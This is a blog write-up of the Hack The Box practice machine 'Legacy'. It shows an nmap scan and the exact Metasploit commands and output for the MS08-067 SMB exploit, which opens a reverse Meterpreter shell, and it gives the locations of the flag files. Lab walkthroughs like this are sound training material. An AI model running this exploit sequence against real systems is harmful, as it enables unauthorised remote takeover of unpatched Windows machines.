# Title: Legacy
  Date: 2019-10-11

This is the second box in this run through of HTB machines. It was easy, and much easier than the first one I did, *Lame*.

## Enumeration

I started of with an nmap scan with version detection. The machine is XP - this should be simple!

```
$ nmap -Pn -sV legacy
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-11 11:15 CDT
Nmap scan report for legacy (10.10.10.4)
Host is up (0.040s latency).
Not shown: 997 filtered ports
PORT     STATE  SERVICE       VERSION
139/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open   microsoft-ds  Microsoft Windows XP microsoft-ds
3389/tcp closed ms-wbt-server
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp
```

I didn't really even do any research for this one, I just searched for "smb" in Metasploit. 

```
search smb
```

And looked for old and highly rated exploits. I got lucky and the first thing I tried worked. /shrug 
This is the one I used:

```   
99   exploit/windows/smb/ms08_067_netapi                             2008-10-28       great      Yes    MS08-067 Microsoft Server Service Relative Path Stack Corruption
```

I selected the exploit, set the RHOST and ran it:

```
msf5 > use exploit/windows/smb/ms08_067_netapi
msf5 exploit(windows/smb/ms08_067_netapi) > show options 

Module options (exploit/windows/smb/ms08_067_netapi):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT    445              yes       The SMB service port (TCP)
   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)


Exploit target:

   Id  Name
   --  ----
   0   Automatic Targeting


msf5 exploit(windows/smb/ms08_067_netapi) > set rhosts legacy
rhosts => legacy
msf5 exploit(windows/smb/ms08_067_netapi) > run

[*] Started reverse TCP handler on 10.10.x.x:4444 
[*] 10.10.10.4:445 - Automatically detecting the target...
[*] 10.10.10.4:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English
[*] 10.10.10.4:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] 10.10.10.4:445 - Attempting to trigger the vulnerability...
[*] Sending stage (180291 bytes) to 10.10.10.4
[*] Meterpreter session 1 opened (10.10.x.x:4444 -> 10.10.10.4:1028) at 2019-10-11 11:16:37 -0500

meterpreter > 
meterpreter > pwd
C:\WINDOWS\system32
```

Cool. I got a shell!

## User flag

The user flag was in C:\Documents and Settings\john\Desktop\user.txt

## Root flag

Nothing else needed to happen for root, the flag was readable here: C:\Documents and Settings\Administrator\Desktop\root.txt

## Endnotes

This one was super easy. Nothing really of note here other than it made me laugh that I guessed a working exploit. Way to make me feel good about myself, HTB!

